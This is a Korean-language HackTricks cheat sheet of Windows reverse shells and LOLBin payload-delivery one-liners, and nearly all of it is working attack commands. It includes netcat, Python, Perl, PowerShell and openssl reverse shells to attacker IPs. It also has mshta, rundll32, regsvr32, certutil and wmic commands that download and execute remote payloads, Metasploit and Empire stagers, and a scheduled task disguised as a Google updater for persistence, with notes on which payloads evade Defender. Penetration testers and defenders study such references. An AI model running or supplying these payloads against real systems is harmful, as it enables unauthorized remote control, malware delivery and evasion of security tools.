# Shells - Windows

{{#include ../../banners/hacktricks-training.md}}

## Lolbas

[lolbas-project.github.io](https://lolbas-project.github.io/)는 Windows용이며, [https://gtfobins.github.io/](https://gtfobins.github.io/)가 Linux용인 것과 같습니다.<sup>[[13]](#references)[[14]](#references)</sup>
Windows는 프로세스 보안에 access token과 privilege를 사용하며, Windows 11에는 선택적으로 사용할 수 있는 `sudo` 명령도 포함되어 있습니다.<sup>[[11]](#references)[[12]](#references)</sup> 일부 **바이너리**를 어떻게 악용해 **임의 코드 실행**과 같은 예상치 못한 동작을 수행할 수 있는지 알아두면 유용합니다.<sup>[[13]](#references)</sup>

아래에 모아 둔 기본 Windows reverse-shell 페이로드는 HighOn.Coffee 및 PayloadsAllTheThings 치트 시트에도 문서화되어 있습니다. 대상에 맞게 경로와 설치된 인터프리터를 조정하세요.<sup>[[1]](#references)[[4]](#references)</sup>

## NC

```bash
nc.exe -e cmd.exe <Attacker_IP> <PORT>
```

## NCAT

피해자

```
ncat.exe <Attacker_IP> <PORT>  -e "cmd.exe /c (cmd.exe  2>&1)"
#Encryption to bypass firewall
ncat.exe <Attacker_IP> <PORT eg.443> --ssl -e "cmd.exe /c (cmd.exe  2>&1)"
```

공격자

```
ncat -l <PORT>
#Encryption to bypass firewall
ncat -l <PORT eg.443> --ssl
```

## SBD

**[sbd](https://www.kali.org/tools/sbd/)는 이식성이 뛰어나고 안전한 Netcat 대안**입니다. Unix 계열 시스템과 Win32에서 작동합니다. 강력한 암호화, 프로그램 실행, 사용자 지정 소스 포트, 지속적인 재연결 기능을 갖춘 sbd는 TCP/IP 통신을 위한 다목적 솔루션을 제공합니다. Windows 사용자는 Kali Linux 배포판의 sbd.exe 버전을 Netcat의 신뢰할 수 있는 대체 도구로 사용할 수 있습니다.<sup>[[15]](#references)</sup>

```bash
# Victims machine
sbd -l -p 4444 -e bash -v -n
listening on port 4444


# Atackers
sbd 10.10.10.10 4444
id
uid=0(root) gid=0(root) groups=0(root)
```

## Python

```bash
#Windows
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

## Perl

```bash
perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby

```bash
#Windows
ruby -rsocket -e 'c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Lua

```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## OpenSSH

공격자 (Kali)

```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```

피해자

```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```

## Powershell

```bash
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
Start-Process -NoNewWindow powershell "IEX(New-Object Net.WebClient).downloadString('http://10.222.0.26:8000/ipst.ps1')"
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile
```

네트워크 호출을 수행하는 프로세스: **powershell.exe**\
디스크에 기록된 Payload: **아니요** (_적어도 procmon으로 찾을 수 있는 곳에는 없었습니다!_).<sup>[[5]](#references)</sup>

```bash
powershell -exec bypass -f \\webdavserver\folder\payload.ps1
```

네트워크 호출을 수행하는 프로세스: **svchost.exe**\
디스크에 기록되는 Payload: **WebDAV 클라이언트 로컬 캐시**.<sup>[[5]](#references)</sup>

**One liner:**

```bash
$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

**이 문서 끝부분에서 다양한 Powershell Shells에 대한 자세한 정보를 확인하세요**

## Mshta

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
mshta vbscript:Close(Execute("GetObject(""script:http://webserver/payload.sct"")"))
```

```bash
mshta http://webserver/payload.hta
```

```bash
mshta \\webdavserver\folder\payload.hta
```

#### **hta-psh reverse shell 예시 (hta를 사용해 PS backdoor를 다운로드하고 실행)**

```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
```

**stager hta를 사용하면 Koadic zombie를 아주 쉽게 다운로드하고 실행할 수 있습니다**.<sup>[[3]](#references)</sup>

#### hta 예시

[**From here**](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f).<sup>[[7]](#references)</sup>

```xml
<html>
<head>
<HTA:APPLICATION ID="HelloExample">
<script language="jscript">
        var c = "cmd.exe /c calc.exe";
        new ActiveXObject('WScript.Shell').Run(c);
</script>
</head>
<body>
<script>self.close();</script>
</body>
</html>
```

#### **mshta - sct**

[**여기에서**](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17).<sup>[[8]](#references)</sup>

```xml
<?XML version="1.0"?>
<!-- rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";o=GetObject("script:http://webserver/scriplet.sct");window.close();  -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:http://webserver/scriplet.sct"")")) -->
<!-- mshta vbscript:Close(Execute("GetObject(""script:C:\local\path\scriptlet.sct"")")) -->
<scriptlet>
<public>
</public>
<script language="JScript">
<![CDATA[
    var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
]]>
</script>
</scriptlet>
```

#### **Mshta - Metasploit**

```bash
use exploit/windows/misc/hta_server
msf exploit(windows/misc/hta_server) > set srvhost 192.168.1.109
msf exploit(windows/misc/hta_server) > set lhost 192.168.1.109
msf exploit(windows/misc/hta_server) > exploit
```

```bash
Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given in the output of metasploit
```

**Defender에서 감지됨**

## **Rundll32**

[**DLL Hello World 예제**](https://github.com/carterjones/hello-world-dll)

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
rundll32 \\webdavserver\folder\payload.dll,entrypoint
```

```bash
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
```

**Defender에 의해 탐지됨**

**Rundll32 - sct**

[mshta - sct](#mshta-sct) 섹션에 나온 scriptlet을 재사용하세요. scriptlet의 첫 주석에 해당 `rundll32.exe` 런처가 포함되어 있습니다.<sup>[[8]](#references)</sup>

#### **Rundll32 - Metasploit**

```bash
use windows/smb/smb_delivery
run
#You will be given the command to run in the victim: rundll32.exe \\10.2.0.5\Iwvc\test.dll,0
```

**Rundll32 - Koadic**

```bash
use stager/js/rundll32_js
set SRVHOST 192.168.1.107
set ENDPOINT sales
run
#Koadic will tell you what you need to execute inside the victim, it will be something like:
rundll32.exe javascript:"\..\mshtml, RunHTMLApplication ";x=new%20ActiveXObject("Msxml2.ServerXMLHTTP.6.0");x.open("GET","http://10.2.0.5:9997/ownmG",false);x.send();eval(x.responseText);window.close();
```

## Regsvr32

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll
```

```
regsvr32 /u /n /s /i:\\webdavserver\folder\payload.sct scrobj.dll
```

**Defender에 탐지됨**

#### Regsvr32 – /i 인수를 사용한 임의 DLL export (실행 제어 및 지속성)

원격 scriptlet(`scrobj.dll`)을 로드하는 것 외에도 `regsvr32.exe`는 로컬 DLL을 로드하고 해당 DLL의 `DllRegisterServer`/`DllUnregisterServer` export를 호출합니다. 커스텀 로더는 서명된 LOLBin으로 위장하면서 임의 코드를 실행하기 위해 이를 자주 악용합니다. 실제 환경에서 확인된 tradecraft 참고 사항 두 가지:<sup>[[6]](#references)</sup>

- 실행 제어 인수: `/i:<arg>`를 통해 특정 스위치가 전달되지 않으면 DLL이 종료됩니다. 예를 들어 Chromium renderer 자식 프로세스를 흉내 내기 위해 `/i:--type=renderer`를 사용합니다. 이렇게 하면 의도치 않은 실행을 줄이고 sandbox의 분석을 방해할 수 있습니다.
- 지속성: `regsvr32`가 DLL을 필요한 `/i` 인수와 함께, 조용히 높은 권한으로 실행하도록 예약 작업을 설정하고 updater 작업으로 위장합니다:
  ```powershell
  Register-ScheduledTask \
    -Action (New-ScheduledTaskAction -Execute "regsvr32" -Argument "/s /i:--type=renderer \"%APPDATA%\Microsoft\SystemCertificates\<name>.dll\"") \
    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)) \
    -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-...}' \
    -TaskPath '\\GoogleSystem\\GoogleUpdater' \
    -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0 -DontStopOnIdleEnd) \
    -RunLevel Highest
  ```

또한 참조: JS 로더를 스테이징하고 나중에 `regsvr32`로 지속성을 확보하는 ClickFix 클립보드-to-PowerShell 변형.<sup>[[6]](#references)</sup>
{{#ref}}
../../generic-methodologies-and-resources/phishing-methodology/clipboard-hijacking.md
{{#endref}}


[**From here**](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1).<sup>[[9]](#references)</sup>

```html
<?XML version="1.0"?>
<!-- regsvr32 /u /n /s /i:http://webserver/regsvr32.sct scrobj.dll -->
<!-- regsvr32 /u /n /s /i:\\webdavserver\folder\regsvr32.sct scrobj.dll -->
<scriptlet>
<registration
    progid="PoC"
    classid="{10001111-0000-0000-0000-0000FEEDACDC}" >
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
        ]]>
</script>
</registration>
</scriptlet>
```

#### **Regsvr32 - Metasploit**

```bash
use multi/script/web_delivery
set target 3
set payload windows/meterpreter/reverse/tcp
set lhost 10.2.0.5
run
#You will be given the command to run in the victim: regsvr32 /s /n /u /i:http://10.2.0.5:8080/82j8mC8JBblt.sct scrobj.dll
```

**stager regsvr를 사용하면 Koadic zombie를 아주 쉽게 다운로드하고 실행할 수 있습니다**.<sup>[[3]](#references)</sup>

## Certutil

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

B64dll을 다운로드하고 디코딩한 다음 실행합니다.<sup>[[5]](#references)</sup>

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
```

B64exe를 다운로드하고 디코딩한 다음 실행합니다.<sup>[[5]](#references)</sup>

```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.exe & payload.exe
```

**Defender에서 탐지됨**

## **Cscript/Wscript**

```bash
powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0.5:8000/reverse_shell.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
```

**Cscript - Metasploit**

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
```

**Defender에서 탐지됨**

## PS-Bat

```bash
\\webdavserver\folder\batchfile.bat
```

네트워크 호출을 수행하는 프로세스: **svchost.exe**\
디스크에 기록된 페이로드: **WebDAV 클라이언트 로컬 캐시**.<sup>[[5]](#references)</sup>

```bash
msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 > shell.bat
impacket-smbserver -smb2support kali `pwd`
```

```bash
\\10.8.0.3\kali\shell.bat
```

**Defender에 탐지됨**

## **MSIExec**

공격자

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.2.0.5 lport=1234 -f msi > shell.msi
python -m SimpleHTTPServer 80
```

피해자:

```
victim> msiexec /quiet /i \\10.2.0.5\kali\shell.msi
```

**감지됨**

## **Wmic**

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
wmic os get /format:"https://webserver/payload.xsl"
```

예시 xsl 파일은 [여기](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)에 있습니다.<sup>[[10]](#references)</sup>

```xml
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
    <ms:script implements-prefix="user" language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /c echo IEX(New-Object Net.WebClient).DownloadString('http://10.2.0.5/shell.ps1') | powershell -noprofile -");
        ]]>
    </ms:script>
</stylesheet>
```

**감지되지 않음**

**stager wmic를 사용하면 Koadic zombie를 매우 쉽게 다운로드하고 실행할 수 있습니다.**<sup>[[3]](#references)</sup>

## Msbuild

- [From here](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```
cmd /V /c "set MB="C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe" & !MB! /noautoresponse /preprocess \\webdavserver\folder\payload.xml > payload.xml & !MB! payload.xml"
```

이 프로젝트에서는 MSBuildShell을 애플리케이션 화이트리스팅 및 `powershell.exe` 제한을 우회하고 PowerShell과 유사한 셸을 제공할 수 있는 PowerShell 호스트로 소개합니다.<sup>[[16]](#references)</sup>\
이 파일을 다운로드하고 실행하기만 하면 됩니다: [https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj](https://raw.githubusercontent.com/Cn33liz/MSBuildShell/master/MSBuildShell.csproj).<sup>[[16]](#references)</sup>

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe MSBuildShell.csproj
```

**탐지되지 않음**

## **CSC**

피해자 머신에서 C# 코드를 컴파일합니다.<sup>[[17]](#references)[[18]](#references)</sup>

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:shell.exe shell.cs
```

여기에서 기본 C# reverse shell을 다운로드할 수 있습니다: [https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

**탐지되지 않음**

## **Regasm/Regsvc**

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /u \\webdavserver\folder\payload.dll
```

**시도해 보지 않았습니다**

[**https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182**](https://gist.github.com/Arno0x/71ea3afb412ec1a5490c657e58449182).<sup>[[2]](#references)</sup>

## Odbcconf

- [여기에서](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/).<sup>[[5]](#references)</sup>

```bash
odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
```

**아직 시도해 보지 않았습니다**

[**https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2**](https://gist.github.com/Arno0x/45043f0676a55baf484cbcd080bbf7c2).<sup>[[2]](#references)</sup>

## Powershell Shells

### PS-Nishang

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

**Shells** 폴더에는 다양한 shell이 있습니다. Invoke-_PowerShellTcp.ps1_을 다운로드하고 실행하려면 스크립트를 복사한 다음 파일 끝에 다음 내용을 추가하세요:<sup>[[19]](#references)</sup>

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
```

웹 서버에서 스크립트를 제공하고 피해자 측에서 실행합니다:<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
```

Defender는 이를 악성 코드로 감지하지 않습니다(아직은, 2019년 3월 4일 기준).

**TODO: 다른 nishang 셸 확인**

### **PS-Powercat**

[**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)

다운로드하고, 웹 서버와 listener를 시작한 다음, 피해자 측에서 실행합니다:<sup>[[22]](#references)</sup>

```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```

Defender는 이를 악성 코드로 탐지하지 않습니다(아직은, 2019년 3월 4일 기준).

**powercat에서 제공하는 기타 옵션:**

Bind shells, Reverse shell (TCP, UDP, DNS), Port redirect, upload/download, payload 생성, 파일 제공...<sup>[[22]](#references)</sup>

```
Serve a cmd Shell:
    powercat -l -p 443 -e cmd
Send a cmd Shell:
    powercat -c 10.1.1.1 -p 443 -e cmd
Send a powershell:
    powercat -c 10.1.1.1 -p 443 -ep
Send a powershell UDP:
    powercat -c 10.1.1.1 -p 443 -ep -u
TCP Listener to TCP Client Relay:
    powercat -l -p 8000 -r tcp:10.1.1.16:443
Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
    powercat -c 10.1.1.15 -p 443 -e cmd -g
Start A Persistent Server That Serves a File:
    powercat -l -p 443 -i C:\inputfile -rep
```

### Empire

[https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)

PowerShell 런처를 만들고 파일에 저장한 다음 다운로드하여 실행합니다.<sup>[[23]](#references)[[26]](#references)[[27]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
```

**악성 코드로 탐지됨**

### MSF-Unicorn

[https://github.com/trustedsec/unicorn](https://github.com/trustedsec/unicorn)

Unicorn을 사용해 Metasploit 백도어의 PowerShell 버전을 생성합니다.<sup>[[24]](#references)</sup>

```
python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
```

생성한 리소스로 msfconsole을 시작합니다:<sup>[[24]](#references)</sup>

```
msfconsole -r unicorn.rc
```

_powershell_attack.txt_ 파일을 제공하는 웹 서버를 시작하고 피해자 시스템에서 실행합니다:<sup>[[24]](#references)</sup>

```
powershell -exec bypass -c "iwr('http://10.2.0.5/powershell_attack.txt')|iex"
```

**악성 코드로 탐지됨**

## 더 보기

[PS>Attack](https://github.com/jaredhaight/PSAttack) 일부 offensive PS modules가 미리 로드된 PS 콘솔 (cyphered)\
[https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f9](https://gist.github.com/NickTyrer/92344766f1d4d48b15687e5e4bf6f93c)[\
WinPWN](https://github.com/SecureThisShit/WinPwn) 일부 offensive PS modules와 proxy detection 기능이 포함된 PS 콘솔 (IEX).<sup>[[25]](#references)</sup>

## References

- [1] [Reverse Shell 치트 시트: PHP, ASP, Netcat, Bash 및 Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Arno0x의 GitHub Gists](https://gist.github.com/Arno0x)
- [3] [Koadic – COM Command & Control 프레임워크](https://www.hackingarticles.in/koadic-com-command-control-framework/)
- [4] [Reverse Shell 치트 시트 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [원격 payload를 다운로드하고 임의 코드를 실행하는 Windows 원라이너](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
- [6] [Check Point Research – 순수한 장막 아래: RAT에서 Builder를 거쳐 Coder까지](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [7] [calc.hta – HTA 역방향 실행 예제 (Arno0x gist)](https://gist.github.com/Arno0x/91388c94313b70a9819088ddf760683f)
- [8] [scriptlet.sct – mshta/rundll32 scriptlet 예제 (Arno0x gist)](https://gist.github.com/Arno0x/e472f58f3f9c8c0c941c83c58f254e17)
- [9] [regsvr32.sct – Regsvr32 scriptlet 예제 (Arno0x gist)](https://gist.github.com/Arno0x/81a8b43ac386edb7b437fe1408b15da1)
- [10] [wmic.xsl – WMIC XSL 스타일시트 예제 (Arno0x gist)](https://gist.github.com/Arno0x/fa7eb036f6f45333be2d6d2fd075d6a7)
- [11] [액세스 토큰 – Win32 앱 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens)
- [12] [Windows용 Sudo (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/advanced-settings/sudo/)
- [13] [LOLBAS](https://lolbas-project.github.io/)
- [14] [GTFOBins](https://gtfobins.github.io/)
- [15] [sbd | Kali Linux 도구](https://www.kali.org/tools/sbd/)
- [16] [MSBuildShell](https://github.com/Cn33liz/MSBuildShell)
- [17] [컴파일러 옵션 – 언어 기능 규칙 (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/language)
- [18] [컴파일러 옵션 – 출력 옵션 (Microsoft Learn)](https://learn.microsoft.com/en-us/dotnet/csharp/language-reference/compiler-options/output)
- [19] [Nishang](https://github.com/samratashok/nishang)
- [20] [Invoke-WebRequest (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1)
- [21] [Invoke-Expression (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.5)
- [22] [powercat](https://github.com/besimorhino/powercat)
- [23] [Empire (보관된 저장소)](https://github.com/EmpireProject/Empire)
- [24] [Unicorn](https://github.com/trustedsec/unicorn)
- [25] [WinPwn](https://github.com/SecureThisShit/WinPwn)
- [26] [Empire Wiki](https://bc-security.gitbook.io/empire-wiki/)
- [27] [multi_generate_agent | Empire Wiki](https://bc-security.gitbook.io/empire-wiki/stagers/multi_generate_agent)
{{#include ../../banners/hacktricks-training.md}}
